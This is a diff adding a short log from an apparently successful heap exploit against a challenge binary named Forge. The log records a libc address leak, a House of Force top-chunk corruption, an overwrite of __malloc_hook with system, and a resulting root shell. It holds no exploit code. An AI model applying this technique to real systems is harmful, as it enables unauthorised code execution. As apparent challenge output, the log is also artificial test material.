@@ -1,0 +1,19 @@
+[+] Started bundled Forge locally
+[+] heap chunk pointer: 0x555568c37260
+[+] unsorted-bin fd: 0x7f98c5bf7ca0
+[+] libc base:       0x7f98c580c000
+[+] corrupted top size at: 0x555568c378b0
+[+] House of Force request: 0x2a435cfc0368
+[+] __malloc_hook <- system (0x7f98c585b420)
+FORGE_SHELL_SUCCESS
+uid=0(root) gid=0(root) groups=0(root)
+/mnt/data/challenges/forge
+content> forged #6
+
+1. forge
+2. temper
+3. inspect
+4. melt
+5. leave
+> the fire dies down.
+[+] Shell execution confirmed
